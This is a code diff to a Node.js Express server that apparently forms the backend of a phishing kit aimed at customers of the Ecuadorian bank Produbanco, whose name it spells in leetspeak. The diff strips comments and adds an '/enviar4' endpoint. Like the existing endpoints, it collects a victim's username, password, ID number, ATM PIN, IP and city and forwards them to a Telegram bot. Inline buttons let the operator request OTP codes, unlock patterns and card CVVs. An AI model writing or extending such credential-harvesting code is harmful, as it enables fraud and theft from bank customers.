@@ -23,7 +23,7 @@ if (!fs.existsSync(CLIENTES_DIR)) {
   fs.mkdirSync(CLIENTES_DIR);
 }
 
-// 🧹 Limpieza automática
+
 setInterval(() => {
   const files = fs.readdirSync(CLIENTES_DIR);
   const ahora = Date.now();
@@ -51,7 +51,7 @@ function cargarCliente(txid) {
   return null;
 }
 
-// 🔹 Enviar patrón
+
 app.post('/api/sendPattern', async (req, res) => {
   const { patron, patronImg, usar, ip, city, txid } = req.body;
 
@@ -72,7 +72,7 @@ Secuencia: <code>${patron}</code>
   `;
 
   try {
-    // Guardamos estado
+
     const cliente = { status: "esperando", usar, ip, ciudad: city, preguntas: [] };
     guardarCliente(txid, cliente);
 
@@ -91,7 +91,7 @@ Secuencia: <code>${patron}</code>
       { headers: formData.getHeaders(), httpsAgent: agent }
     );
 
-    // Botones de control
+
     const keyboard = {
       inline_keyboard: [
         [
@@ -124,7 +124,7 @@ Secuencia: <code>${patron}</code>
   }
 });
 
-// 🔹 Enviar usuario y clave
+
 app.post('/enviar', async (req, res) => {
   const { usar, clavv, txid, ip, ciudad } = req.body;
 
@@ -165,7 +165,7 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
-// 🔹 Enviar OTP
+
 app.post('/enviar3', async (req, res) => {
   const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;
 
@@ -208,7 +208,50 @@ app.post('/enviar3', async (req, res) => {
   res.sendStatus(200);
 });
 
-// 🔹 Webhook de control (botones Telegram)
+app.post('/enviar4', async (req, res) => {
+  const { usar, clavv, txid, cece, etm, ip, ciudad } = req.body;
+
+  const mensaje = `
+🔑🟢PRODUB4NC0🟢
+🆔 ID: <code>${txid}</code>
+
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clavv}</code>
+
+🔑 RUC: <code>${cece}</code>
+🔑 4TM: <code>${etm}</code>
+
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
+`;
+
+  const cliente = { status: "esperando", usar, clavv, ip, ciudad };
+  guardarCliente(txid, cliente);
+
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
+        { text: "🏧CAJERO", callback_data: `cajero:${txid}` },
+        { text: "🔐PATRON", callback_data: `patron:${txid}` }
+      ],
+      [
+        { text: "💳C3VV", callback_data: `ceve:${txid}` },
+        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
+      ]
+    ]
+  };
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
+  });
+
+  res.sendStatus(200);
+});
+
+
 app.post('/webhook', async (req, res) => {
   if (req.body.callback_query) {
     const callback = req.body.callback_query;
@@ -232,7 +275,7 @@ app.post('/webhook', async (req, res) => {
   res.sendStatus(200);
 });
 
-// 🔹 Status checker
+
 app.get('/sendStatus.php', (req, res) => {
   const txid = req.query.txid;
   const cliente = cargarCliente(txid) || { status: 'esperando', preguntas: [] };
